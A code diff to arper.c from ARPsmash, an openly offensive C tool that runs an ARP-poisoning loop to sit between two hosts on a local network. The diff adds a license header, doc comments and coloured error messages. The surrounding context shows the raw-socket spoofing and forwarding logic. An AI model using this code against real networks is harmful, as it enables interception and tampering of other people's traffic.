@@ -1,5 +1,20 @@
+/*
+ * ARPsmash/arper.c
+ *
+ * (C) 2007,2009, BlackLight <blacklight@autistici.org>
+ *
+ *		This program is free software; you can redistribute it and/or
+ *		modify it under the terms of the GNU General Public License
+ *		as published by the Free Software Foundation; either version
+ *		3 of the License, or (at your option) any later version.
+ */
+
 #include "arpsmash.h"
 
+/**
+ * @brief Main function. It makes the poisoning loop
+ * @return Nothing if successful, a value < 0 in case of error
+ */
 int doarp()  {
 	int ip4addr;
 	struct arp_hdr arp;
@@ -9,7 +24,7 @@ int doarp()  {
 	t_hw=NULL;
 
 	if ((sd=socket(PF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)))<0)  {
-		fprintf (stderr,"*** Socket error: %s\n",strerror(errno));
+		fprintf (stderr,"%s***Socket error: %s%s\n", RED, strerror(errno), NORMAL);
 		return -1;
 	}
 
@@ -20,7 +35,7 @@ int doarp()  {
 	memset (dlink.sll_addr,0xFF,ETH_ALEN);
 
 	if (bind(sd, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
-		fprintf (stderr,"*** Bind error: %s\n",strerror(errno));
+		fprintf (stderr,"%s***Bind error: %s%s\n", RED, strerror(errno), NORMAL);
 		return -2;
 	}
 
@@ -43,7 +58,7 @@ int doarp()  {
 	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));
 	
 	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
-		fprintf (stderr,"\t*** Error in sendto: %s\n",strerror(errno));
+		fprintf (stderr,"\t%s***Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
 		return -3;
 	}
 
@@ -52,27 +67,29 @@ int doarp()  {
 	sleep(TIMEOUT);
 	
 	if (!t_hw)  {
-		fprintf (stderr,"\t*** Unable to get %s physical address: %s\n",t1,strerror(errno));
+		fprintf (stderr,"\t%s***Error: Unable to get %s physical address: %s%s\n", RED, t1, strerror(errno), NORMAL);
 		return -4;
 	}
 
 	t1_hw = (__u8*) malloc(ETH_ALEN);
 	memcpy (t1_hw,t_hw,ETH_ALEN);
-	printf ("\t*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
+	printf ("\t%s*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x%s\n",
+			CYAN,
 			t1,
 			t1_hw[0],
 			t1_hw[1],
 			t1_hw[2],
 			t1_hw[3],
 			t1_hw[4],
-			t1_hw[5]
+			t1_hw[5],
+			NORMAL
 	);
 
 	ip4addr=inet_addr((char*) t2);
 	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));
 
 	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
-		fprintf (stderr,"\t*** Error in sendto: %s\n",strerror(errno));
+		fprintf (stderr,"%s\t*** Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
 		return -5;
 	}
 
@@ -81,20 +98,22 @@ int doarp()  {
 	sleep(TIMEOUT);
 
 	if (!t_hw)  {
-		fprintf (stderr,"\t*** Unable to get %s physical address: %s\n",t2,strerror(errno));
+		fprintf (stderr,"\t%s***Error: Unable to get %s physical address: %s%s\n", RED, t2, strerror(errno), NORMAL);
 		return -6;
 	}
 
 	t2_hw = (__u8*) malloc(ETH_ALEN);
 	memcpy (t2_hw,t_hw,ETH_ALEN);
-	printf ("\t*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n",
+	printf ("\t%s*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x%s\n",
+			CYAN,
 			t2,
 			t2_hw[0],
 			t2_hw[1],
 			t2_hw[2],
 			t2_hw[3],
 			t2_hw[4],
-			t2_hw[5]
+			t2_hw[5],
+			NORMAL
 			);
 
 	pthread_create (&th_forward, NULL, forward, (void*) &dlink);
@@ -113,7 +132,7 @@ int doarp()  {
 		memcpy (&arp.ip_target, &ip4addr, 4);
 
 		if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
-			fprintf (stderr,"*** Error in sendto: %s\n",strerror(errno));
+			fprintf (stderr,"%s*** Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
 			return -7;
 		}
 
@@ -125,7 +144,7 @@ int doarp()  {
 		memcpy (&arp.ip_target, &ip4addr, 4);
 
 		if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
-			fprintf (stderr,"*** Error in sendto: %s\n",strerror(errno));
+			fprintf (stderr,"%s*** Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
 			return -8;
 		}
 
@@ -135,16 +154,20 @@ int doarp()  {
 	return 0;
 }
 
+/**
+ * @brief This calls doarp() function initializating right values
+ * @return Nothing if successful, a value < 0 in case of error
+ */
 int arpsmash (__u8* interface, __u8* addr1, __u8* addr2)  {
 	ifc = (__u8*) strdup((char*) interface);
 	
 	if (!(t1=get_host_addr(addr1)))  {
-		fprintf (stderr,"*** Error - Unable to resolve %s\n",optarg);
+		fprintf (stderr,"%s*** Error - Unable to resolve %s%s\n", RED, addr1, NORMAL);
 		return -1;
 	}
 
 	if (!(t2=get_host_addr(addr2)))  {
-		fprintf (stderr,"*** Error - Unable to resolve %s\n",optarg);
+		fprintf (stderr,"%s*** Error - Unable to resolve %s%s\n", RED, addr2, NORMAL);
 		return -1;
 	}
 
